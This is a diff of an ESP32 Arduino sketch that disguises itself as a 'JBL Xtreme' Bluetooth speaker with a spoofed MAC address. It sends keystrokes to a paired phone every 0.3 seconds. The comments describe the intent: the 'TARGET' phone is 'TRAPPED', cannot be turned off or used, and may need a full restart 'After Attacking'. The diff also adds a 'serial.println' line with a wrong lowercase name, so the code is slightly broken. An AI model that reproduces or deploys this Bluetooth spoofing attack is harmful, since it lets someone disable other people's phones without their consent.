@@ -13,14 +13,14 @@
 // ---- Then it CAN NOT BE TURNED OFF by pressing Turn OFF Button on side of phone
 // ---- And I think also more DISABLED Types ...
 // ------------------------------------------------------------------------------------------------
-// -- ! CRITICAL BUGS (THAT MIGHT HAPPEN TO YOUR DEVICE !
+// -- ! CRITICAL BUGS (THAT MIGHT HAPPEN TO YOUR "TARGET" DEVICE !
 // ---- CAN NOT show opened apps (like ALT TAB on PC)
 // ---- On some Moble Phones MUST be restarted WHOLE PHONE (After Attacking) !
 // ------------------------------------------------------------------------------------------------
 
 #include <BleKeyboard.h>
 // BLE Keyboard
-BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 100);
+BleKeyboard bleKeyboard("JBL Xtreme", "Custom Manufacturer", 1000); // Increased Time to 1000
 
 //                              Set HERE YOUR MAC address
 const uint8_t customMacAddr[] = {0xF4, 0xF3, 0xAA, 0x07, 0xE4, 0xF2};
@@ -31,7 +31,7 @@ void setup() {
 
   // set ! CUSTOM MAC ADDRESS !
   esp_base_mac_addr_set(customMacAddr);
-  Serial.print("Vlastná MAC adresa nastavená na: ");
+  Serial.print("Set MAC address to : ");
   for (int i = 0; i < 6; i++) {
     Serial.printf("%02X", customMacAddr[i]);
     if (i < 5) Serial.print(":");
@@ -54,6 +54,7 @@ void loop() {
     // SEND KEYSTROKE EVERY 0.3 Seconds
     // Ensures now will be phone (or connected device TRAPPED and cannot use phone enymore) 
     delay(300);
+    serial.println("");
   } else {
     Serial.println("Waiting for connection on BLE Device...");
   }
